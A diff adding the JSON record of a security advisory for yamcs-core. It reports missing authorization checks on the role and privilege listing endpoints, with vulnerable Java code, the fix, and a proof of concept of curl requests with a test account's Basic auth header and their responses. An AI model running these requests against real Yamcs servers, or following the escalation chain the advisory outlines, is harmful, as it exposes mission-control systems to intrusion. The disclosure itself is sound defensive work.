@@ -1,0 +1,68 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-08-28T17:13:24Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.yamcs:yamcs-core"
+  },
+  "Advisory": {
+    "DatabaseId": 417781,
+    "Id": "GSA_kwCzR0hTQS1jdnc0LTU1cHAtM2hmcc4ABl_1",
+    "GhsaId": "GHSA-cvw4-55pp-3hfq",
+    "References": [
+      {
+        "Url": "https://github.com/yamcs/yamcs/security/advisories/GHSA-cvw4-55pp-3hfq"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/commit/c2aec1c242e656e48b52c7f87deea88183bb592d"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/commit/dcaec5f0b2f4231b8e313e94d79a937169c9e0ba"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/releases/tag/yamcs-5.12.8"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/releases/tag/yamcs-5.13.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-cvw4-55pp-3hfq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-cvw4-55pp-3hfq"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-55547"
+      }
+    ],
+    "Description": "## Summary\n\nMissing authorization checks on three IAM API endpoints (`GET /api/roles`, `GET /api/roles/{name}`, `GET /api/privileges`) allow any authenticated user — regardless of their assigned permissions — to enumerate the complete list of system privileges and role definitions. An attacker with only a low-privilege account (e.g., a read-only operator) can retrieve the full privilege taxonomy of the server, including the names and assignments of all administrator-level capabilities. This information directly enables targeted privilege escalation attacks.\n\n---\n\n## Details\n\nThree handler methods in `IamApi.java` serve sensitive security metadata without performing any authorization check:\n\n**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java`\n\n```java\n// Line 73 — GET /api/roles\n@Override\npublic void listRoles(Context ctx, Empty request, Observer\u003cListRolesResponse\u003e observer) {\n    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();\n    List\u003cRole\u003e roles = securityStore.getDirectory().getRoles();\n    // No ctx.checkSystemPrivilege() call — any authenticated user proceeds\n    ...\n    observer.complete(responseb.build());\n}\n\n// Line 87 — GET /api/roles/{name}\n@Override\npublic void getRole(Context ctx, GetRoleRequest request, Observer\u003cRoleInfo\u003e observer) {\n    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();\n    Role role = securityStore.getDirectory().getRole(request.getName());\n    // No ctx.checkSystemPrivilege() call\n    observer.complete(toRoleInfo(role));\n}\n\n// Line 112 — GET /api/privileges\n@Override\npublic void listPrivileges(Context ctx, Empty request, Observer\u003cListPrivilegesResponse\u003e observer) {\n    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();\n    List\u003cSystemPrivilege\u003e privileges = new ArrayList\u003c\u003e(securityStore.getSystemPrivileges());\n    // No ctx.checkSystemPrivilege() call\n    observer.complete(responseb.build());\n}\n```\n\nBy contrast, all write operations and user-management endpoints in the same file correctly enforce authorization. For example:\n\n```java\n// Line 126 — GET /api/users (correctly protected)\npublic void listUsers(...) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ← present\n    ...\n}\n\n// Line 142 — POST /api/users (correctly protected)\npublic void createUser(...) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ← present\n    ...\n}\n```\n\nThe three vulnerable endpoints share the same `ControlAccess` protection requirement as the user-management endpoints but were never given the corresponding check.\n\n**Route definitions** (confirmed in `yamcs-api/src/main/proto/yamcs/protobuf/iam/iam.proto`):\n\n```\nGET /api/privileges   → IamApi.listPrivileges()\nGET /api/roles        → IamApi.listRoles()\nGET /api/roles/{name} → IamApi.getRole()\n```\n\n---\n\n## PoC\n\u003cimg width=\"2324\" height=\"1086\" alt=\"image\" src=\"https://github.com/user-attachments/assets/98ec3e81-556d-41e1-9211-10a5b9ad0d59\" /\u003e\n\n\n### Environment\n\n- Yamcs version: 5.13.1-SNAPSHOT (latest master)\n- Auth module: YamlAuthModule (default)\n- Two accounts available: `admin` (Administrator) and `operator` (Operator)\n- Calculate the Basic Auth credentials for the two accounts (this needs to be done only once). Please modify according to the actual situation. These credentials will be used in subsequent commands. Here, there is a test low-privilege account named \"operator\" with the password \"password\".\n\n\u003cimg width=\"2243\" height=\"223\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5614013c-2143-4f61-aba3-eab1cba24b67\" /\u003e\n\n`powershell -command \"[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin'))\"`\n\n`powershell -command \"[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('operator:password'))\"`\n\n### Step 1 — Confirm that protected endpoints correctly return 403 for low-privilege users\n\n```cmd\ncurl -s -o nul -w \"HTTP %{http_code}\" http://localhost:8090/api/users -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n```\n\nExpected: `HTTP 403` — the user-list endpoint enforces `ControlAccess`.\n\n### Step 2 — Enumerate all system privileges with the operator account\n\n```cmd\ncurl -s http://localhost:8090/api/privileges -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n```\n\n**Actual response (HTTP 200):**\n\n```\nC:\\Users\\20616\u003ecurl -s http://localhost:8090/api/privileges -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n{\n  \"systemPrivileges\": [\"ChangeMissionDatabase\", \"CommandOptions\", \"ControlAccess\", \"ControlActivities\", \"ControlAlarms\", \"ControlArchiving\", \"ControlCommandClearances\", \"ControlCommandQueue\", \"ControlFileTransfers\", \"ControlLinks\", \"ControlProcessor\", \"ControlServices\", \"ControlTimeCorrelation\", \"ControlTimeline\", \"CreateInstances\", \"GetMissionDatabase\", \"ManageAnyBucket\", \"ManageParameterLists\", \"ModifyCommandHistory\", \"ReadActivities\", \"ReadAlarms\", \"ReadCommandHistory\", \"ReadEvents\", \"ReadFileTransfers\", \"ReadLinks\", \"ReadSystemInfo\", \"ReadTables\", \"ReadTimeline\", \"WriteEvents\", \"WriteTables\", \"web.AccessAdminArea\"]\n}\n```\n\nThe operator account receives the server's complete privilege taxonomy — all 31 system privileges including `ControlAccess` (full user management) and `ChangeMissionDatabase` (algorithm-level RCE, see related advisory).\n\n### Step 3 — Enumerate all defined roles with the operator account\n\n```cmd\ncurl -s http://localhost:8090/api/roles -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n```\n\n**Actual response (HTTP 200):**\n\n```\nC:\\Users\\20616\u003ecurl -s http://localhost:8090/api/roles -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n{\n}\n```\n\nThe endpoint returns HTTP 200 (no authorization check triggered). The empty body reflects the test environment: the `YamlAuthModule` stores role names as plain strings in `users.yaml` and does not persist `Role` objects into the security store's `Directory`. In any Yamcs instance where roles have been created through the REST API (`POST /api/roles`), this endpoint returns the full role-to-privilege mapping for every defined role.\n\n### Step 4 — Attempt to read a specific role by name\n\n```cmd\ncurl -s http://localhost:8090/api/roles/Administrator -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n```\n\n**Actual response:**\n\n```\nC:\\Users\\20616\u003ecurl -s http://localhost:8090/api/roles/Administrator -H \"Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ=\"\n{\n  \"code\": 404,\n  \"type\": \"NotFoundException\",\n  \"msg\": \"Resource not found\"\n}\n```\n\nThe 404 is a business-logic outcome (the role object does not exist in the `Directory` for this test configuration), **not** an authorization rejection. The server never checked whether the caller is permitted to read role data — it proceeded to the lookup and returned the lookup result. In a deployment where roles are registered as objects, this endpoint returns their full privilege configuration to any authenticated user.\n\n### Observed vs Expected\n\n| Request | Expected | Actual | Note |\n|---------|----------|--------|------|\n| `GET /api/users` (operator) | 403 | **403** ✓ | Auth check present |\n| `GET /api/privileges` (operator) | 403 | **200** ✗ | **Confirmed — full privilege list leaked** |\n| `GET /api/roles` (operator) | 403 | **200** ✗ | Auth check absent; empty only in this test setup |\n| `GET /api/roles/Administrator` (operator) | 403 | **404** ✗ | No auth check; 404 = role not in Directory, not access denied |\n\n---\n\n## Impact\n\n**Vulnerability type:** Broken Function Level Authorization (BFLA) / Missing Authorization (OWASP API Security Top 10 2023: API5)\n\n**Who is impacted:**  \nAny deployment of Yamcs that has authentication enabled (the default for production setups) and has more than one user tier. This includes the vast majority of operational Yamcs installations in ground station, satellite operations, and mission control contexts.\n\n**Direct impact:**  \n- Any authenticated user, including operators, guest accounts, or service accounts with minimal privileges, can retrieve the server's complete privilege taxonomy and all role-to-privilege mappings.\n\n**Chained impact:**  \nThe disclosed privilege names and role definitions provide an attacker with a precise roadmap for privilege escalation:\n1. Identify which privilege grants the capability they need (e.g., `ChangeMissionDatabase` for RCE via the algorithm engine, `ControlAccess` for full user management).\n2. Identify which roles carry that privilege.\n3. Target the accounts that hold those roles for credential theft, session hijacking, or social engineering.\n\nIn mission-critical environments (spacecraft operations, industrial control), unauthorized privilege escalation via this information leak could have safety implications beyond IT security.\n\n---\n\n## Fix\n\nAdd `ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess)` as the first statement in each of the three affected methods, matching the pattern already used by adjacent endpoints in the same file:\n\n```java\n// IamApi.java — apply to all three methods\n\npublic void listRoles(Context ctx, Empty request, Observer\u003cListRolesResponse\u003e observer) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE\n    ...\n}\n\npublic void getRole(Context ctx, GetRoleRequest request, Observer\u003cRoleInfo\u003e observer) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE\n    ...\n}\n\npublic void listPrivileges(Context ctx, Empty request, Observer\u003cListPrivilegesResponse\u003e observer) {\n    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE\n    ...\n}\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-28T17:13:23Z",
+    "Severity": "MODERATE",
+    "Summary": "Yamcs's Missing Authorization on Role and Privilege Enumeration Endpoints Allows Any Authenticated User to Disclose Full Security Configuration",
+    "UpdatedAt": "2026-08-28T17:13:24Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 4.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.12.8"
+      },
+      "VulnerableVersionRange": "\u003c= 5.12.7"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.13.2"
+      },
+      "VulnerableVersionRange": "\u003e= 5.13.0, \u003c= 5.13.1"
+    }
+  ]
+}
